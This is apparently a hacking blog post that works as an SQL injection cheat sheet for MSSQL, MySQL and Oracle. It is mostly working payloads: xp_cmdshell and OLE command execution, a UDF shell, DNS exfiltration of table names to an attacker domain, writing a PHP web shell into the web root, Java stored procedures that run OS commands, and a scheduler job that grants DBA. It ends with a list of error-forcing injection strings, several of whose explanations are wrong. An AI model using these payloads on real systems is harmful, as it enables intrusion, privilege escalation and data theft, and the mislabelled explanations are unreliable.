---
title: "Force Errors from Database to get SQLi"
tags: ['Hacking', 'SQLi']
date: 2024-10-03
toc: true
unlisted: true
author: 'Ren'
authorlink: 'https://about.0x0060.dev/'
---

## MSSQL  

### OLE Automation Procedures

```  
DECLARE @Object INT;  
EXEC sp_OACreate 'WScript.Shell', @Object OUTPUT;  
EXEC sp_OAMethod @Object, 'Run', NULL, 'cmd.exe /c whoami > C:\output.txt';  
```

This uses OLE Automation procedures to execute system commands.

### XP_CMD Shell with Privilege Escalation

```  
EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE;  
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;  
EXEC xp_cmdshell 'whoami';  
```

This enables **xp_cmdshell** to execute system commands if it's not already enabled.

### Linked Servers

```  
EXEC sp_addlinkedserver 'attacker_server';  
EXEC sp_addlinkedsrvlogin 'attacker_server', 'false', NULL, 'username', 'password';  
EXEC ('xp_cmdshell ''net user''') AT attacker_server;  
```

This technique uses linked servers to run commands on a different server.

## MySQL

### UDF (User Defined Functions) for Remote Command Execution

```  
CREATE TABLE foo(line BLOB);  
INSERT INTO foo VALUES (LOAD_FILE('/usr/lib/lib_mysqludf_sys.so'));  
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';  
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';  
SELECT sys_exec('id > /tmp/out; chown mysql.mysql /tmp/out');  
```

This technique involves creating a UDF to execute system commands.

### DNS Exfiltration

```  
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT table_name FROM information_schema.tables LIMIT 0,1), '.attacker.com\\a'));  
```

This exfiltrates data through DNS requests to an attacker-controlled domain.

### Binary Log Injections

```  
SET GLOBAL general_log = 'ON';  
SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log';  
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';  
```

This exploits the binary log feature to write a web shell.

## Oracle

### Java Procedures for Command Execution

```  
EXEC dbms_java.grant_permission( 'SCOTT', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute' );  
EXEC dbms_java.grant_permission( 'SCOTT', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '' );  
EXEC dbms_java.grant_permission( 'SCOTT', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '' );  

CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "cmd" AS  
import java.io.*;  
public class cmd {  
   public static String run(String cmd) {  
      try {  
         StringBuffer output = new StringBuffer();  
         Process p = Runtime.getRuntime().exec(cmd);  
         BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));  
         String line = "";  
         while ((line = reader.readLine())!= null) {  
            output.append(line + "\n");  
         }  
         return output.toString();  
      } catch (Exception e) {  
         return e.toString();  
      }  
   }  
};  
/  

CREATE OR REPLACE FUNCTION run_cmd(p_cmd IN VARCHAR2) RETURN VARCHAR2  
AS LANGUAGE JAVA  
NAME 'cmd.run(java.lang.String) return java.lang.String';  

SELECT run_cmd('id') FROM dual;  
```

This uses Java stored procedures to execute system commands.

### UTL_FILE Package for File Access

```  
DECLARE  
   l_file UTL_FILE.FILE_TYPE;  
   l_text VARCHAR2(32767);  
BEGIN  
   l_file := UTL_FILE.FOPEN('DIRECTORY_NAME', 'output.txt', 'W');  
   UTL_FILE.PUT_LINE(l_file, 'Data from UTL_FILE');  
   UTL_FILE.FCLOSE(l_file);  
END;  
```

This technique uses the UTL_FILE package to write files to the server.

### DBMS_SCHEDULER for Job Execution

```  
BEGIN  
   DBMS_SCHEDULER.create_job(  
      job_name => 'job1',  
      job_type => 'PLSQL_BLOCK',  
      job_action => 'BEGIN EXECUTE IMMEDIATE ''GRANT DBA TO SCOTT''; END;',  
      start_date => SYSTIMESTAMP,  
      repeat_interval => NULL,  
      end_date => NULL,  
      enabled => TRUE  
   );  
END;  
```

This uses DBMS_SCHEDULER to execute jobs that can change database permissions.

## Techniques to Force Errors from Databases for SQL Injection

Forcing errors in databases can help reveal valuable information about the underlying SQL queries, database structure, and sometimes even the data itself. Here are some advanced techniques to force errors from various databases:

### 1. Syntax Errors

#### Classic Syntax Error

```  
' OR 1=1; --  
```

Introduce a deliberate syntax error to elicit an error message.

#### Unclosed Quotes

```  
' OR 'a'='a  
```

Leave a quote unclosed to generate an error.

### 2. Type Conversion Errors

#### Invalid Type Casting

```  
' UNION SELECT CAST('abc' AS SIGNED) --  
```

Cast a string to an integer to cause a type conversion error.

### 3. Function-Based Errors

#### Division by Zero

```  
' UNION SELECT 1/0 --  
```

Force a division by zero error.

#### Invalid Function Usage

```  
' UNION SELECT EXP('abc') --  
```

Use a function incorrectly to trigger an error.

### 4. Subquery Errors

#### Invalid Subquery

```  
' UNION SELECT (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) AS temp) --  
```

Use a subquery in a way that causes an error.

### 5. Database-Specific Errors

#### MySQL Errors

```  
' UNION SELECT GTID_SUBSET('abc', 'def') --  
```

Use invalid queries to trigger MySQL-specific errors.

#### PostgreSQL Errors

```  
' UNION SELECT TO_NUMBER('abc', '999') --  
```

Use invalid operations to cause PostgreSQL errors.

#### MSSQL Errors

```  
' UNION SELECT CONVERT(INT, 'abc') --  
```

Use MSSQL-specific functions incorrectly to trigger errors.

### 6. Information Schema Queries

#### Invalid Table Name

```  
' UNION SELECT table_name FROM information_schema.tables WHERE table_name = 'non_existent_table' --  
```

Query the information schema with an invalid table name.

### 7. Blind SQL Injection Errors

#### Deliberate False Condition

```  
' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='non_existent_database') --  
```

Use a false condition to force an error indirectly.

### 8. Advanced Error Techniques

#### Recursive Queries

```  
' UNION SELECT 1 FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4) AS temp WHERE temp=1 --  
```

Use recursive queries to force errors.

#### Invalid Hexadecimal Values

```  
' UNION SELECT 0xZZ --  
```

Use invalid hexadecimal values to trigger errors.

### 9. Combining Techniques

#### Chained Error Forcing

```  
' UNION SELECT CONVERT(INT, 'abc') UNION SELECT 1/0 UNION SELECT TO_NUMBER('abc', '999') --  
```

Combine multiple error-forcing techniques for more robust results.
